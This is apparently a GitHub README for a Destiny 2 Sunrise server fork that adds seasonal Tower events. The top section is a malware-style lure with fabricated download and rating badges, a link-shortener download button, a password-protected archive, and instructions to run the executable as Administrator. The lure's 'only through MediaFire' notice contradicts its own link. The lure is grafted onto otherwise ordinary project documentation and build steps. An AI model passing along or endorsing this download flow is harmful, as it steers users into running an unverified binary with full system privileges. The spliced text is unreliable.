<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Tower Events At Sunrise

<p align="center">
## Revisit the Tower’s seasonal celebrations

Festival trees and candlelight. Dawning snow and the Hangar rink. Crimson Days decorations at the Farm.

**Tower Events At Sunrise** brings the seasonal content authored into Destiny 2 build **86657** into one configurable Sunrise experience. Pick your decorations, choose the music, and explore.

Built on **Sunrise 0.3.2.0**, with the supporting fixes from the tested event branch. The in-game **SUNRISE** banner and version stay unchanged; **0.1.0** identifies this fork’s preview package.

| Make the Tower your own | What you can do |
| :--- | :--- |
| **Choose the decorations** | Show individual events, combine them, or return to an undecorated Tower from the **Events** page. |
| **Set the soundtrack** | Choose a seasonal theme or let the game follow the events you have enabled. |
| **Collect Festival Candy** | Pickups award Candy through the compiled C++ server and normal inventory replication. |
| **Visit the Farm** | Explore its authored Dawning and Crimson Days decorations. |

## Choose your event

Each event appears where its content was authored in this game build.

| Event | Tower locations | Also included |
| :--- | :--- | :--- |
| **Festival of the Lost** | Courtyard · Bazaar · Hangar · Annex | Seasonal music and Candy pickups |
| **The Dawning** | Courtyard · Bazaar snow · Hangar snow and rink | Farm decorations and seasonal music |
| **Crimson Days** | Courtyard | Farm decorations and seasonal music |
| **Solstice of Heroes** | Courtyard | Seasonal music |
| **Iron Banner** | Courtyard | Authored event decorations |
| **Trials of Osiris / Saint-14** | Hangar | Saint-14 and his ship |
| **Guardian Games** | Music only | Its podium placement list is empty in this build |

### Festival Candy rewards

| Pickup | Candy |
| :--- | ---: |
| Courtyard blue | **50** |
| Bazaar blue | **60** |
| Purple in either tree | **250** |

## Build from source

Use **Visual Studio 2026**, the **v145 C++ toolset**, and **Windows SDK 10.0.26100.0**. Run these commands from a Developer PowerShell with CMake available:

```powershell
msbuild Sunrise.sln /m /p:Configuration=Release /p:Platform=x64
cmake -S tests -B build/tests
cmake --build build/tests --config Release
ctest --test-dir build/tests -C Release --output-on-failure
```


---

                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007
